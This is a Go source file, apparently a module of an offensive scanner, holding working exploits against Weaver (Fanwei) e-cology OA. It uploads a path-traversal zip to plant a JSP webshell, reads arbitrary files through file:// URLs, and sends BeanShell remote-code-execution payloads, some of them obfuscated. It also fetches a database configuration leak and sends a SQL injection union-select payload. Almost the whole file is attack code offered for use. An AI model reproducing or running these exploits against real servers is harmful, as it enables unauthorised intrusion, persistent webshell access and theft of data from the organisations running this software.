package fanwei

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"strings"
	"ui/common"
)

var (
	exp1 = "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp" //泛微OA weaver.common.Ctrl 任意文件上传漏洞
)

var (
	exp2 = []string{"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt", "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt"}
)

var (
	//exp3 = "/weaver/bsh.servlet.BshServlet"
	exp3 = []string{
		"/bsh.servlet.BshServlet",
		"/weaver/bsh.servlet.BshServlet",
		"/weaveroa/bsh.servlet.BshServlet",
		"/oa/bsh.servlet.BshServlet",
	} //泛微OA Bsh 远程代码执行漏洞
	payload3 = []string{
		`bsh.script=exec("whoami");&bsh.servlet.output=raw`,
		`bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw`,
		`bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami`,
	}
)

var (
	exp4 = "/mobile/DBconfigReader.jsp" //泛微OA e-cology 数据库配置信息泄漏漏洞
)

var (
	exp5 = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333" //泛微OA WorkflowCenterTreeData接口SQL注入(
)

var (
	exp6 = "/page/exportImport/uploadOperation.jsp" //v9任意文件上传
)

//common ctrl文件上传
func Exp1(urllist string) string {
	s := ""
	mm := common.GenerateRandomStr(8)

	webshellName1 := mm + ".jsp"
	webshellName2 := "../../../" + webshellName1

	zipBytes, err := common.CreateZipFile(mm, webshellName2)
	if err != nil {
		fmt.Println("Error creating zip file:", err)
		return ""
	}
	url := urllist + "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file1", mm+".zip")
	if err != nil {
		fmt.Println("Error creating form file:", err)
		return ""
	}
	_, err = part.Write(zipBytes)
	if err != nil {
		fmt.Println("Error writing zip data to form file:", err)
		return ""
	}
	err = writer.Close()
	if err != nil {
		fmt.Println("Error closing multipart writer:", err)
		return ""
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return ""
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error uploading file:", err)
		return ""
	}
	defer resp.Body.Close()

	getShellURL := urllist + "/cloudstore/" + webshellName1
	getShellResp, err := http.Get(getShellURL)
	if err != nil {
		fmt.Printf("Error getting webshell: %v\n", err)
		return ""
	}
	defer getShellResp.Body.Close()

	if getShellResp.StatusCode == 200 {
		s = fmt.Sprintf("Exploit successful, webshell URL:", getShellURL)
	} else {
		s = fmt.Sprintf("Webshell not found, exploit failed,不存在漏洞")
	}
	return s
}

func Exp2(url string) string {
	s := ""
	for i := range exp2 {
		k := common.Printbody(common.Get(url, exp2[i]))
		if strings.Contains(k, "id") {
			s = fmt.Sprintf("%s存在泛微云桥任意读取漏洞", url+exp2[i])
		} else {
			s = fmt.Sprintf("%s不存在泛微云桥任意读取漏洞", url+exp2[i])
		}
	}
	return s
}

func Exp3(url string) string {
	s := ""
	for i := range exp3 {
		for j := range payload3 {
			k, _ := common.Post(url, exp3[i], payload3[j])
			if k.StatusCode == 200 && !strings.Contains(common.Printbody(k), ";</script>") && !strings.Contains(common.Printbody(k), "Login.jsp") && !strings.Contains(common.Printbody(k), "Error") {
				s = fmt.Sprintf("%s泛微OA Bsh 远程代码执行漏洞,请移至命令执行模块利用", url+exp3[i])
			} else {
				s = fmt.Sprintf("%s不存在泛微OA Bsh 代码执行漏洞", url+exp3[i])
			}
		}
	}
	return s
}

func Exp4(url string) string {
	s := ""
	k := common.Get(url, exp4)
	if k.StatusCode == 200 {
		s = fmt.Sprintf("%s存在泛微OA e-cology 数据库配置信息泄漏漏洞,请移至数据解密模块", url+exp4)
	} else {
		s = fmt.Sprintf("%s不存在泛微OA e-cology 数据库配置信息泄漏漏洞", url+exp4)
	}
	return s
}

func Exp5(url string) string {
	s := ""
	data := `formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1`
	k, _ := common.Post(url, exp5, data)
	if k.StatusCode == 200 {
		s = fmt.Sprintf("%s存在泛微OA WorkflowCenterTreeData接口SQL注入", url+exp5)
	} else {
		s = fmt.Sprintf("%s不存在泛微OA WorkflowCenterTreeData接口SQL注入", url+exp5)
	}
	return s
}

func Exp6(url string) string {
	return ""
}
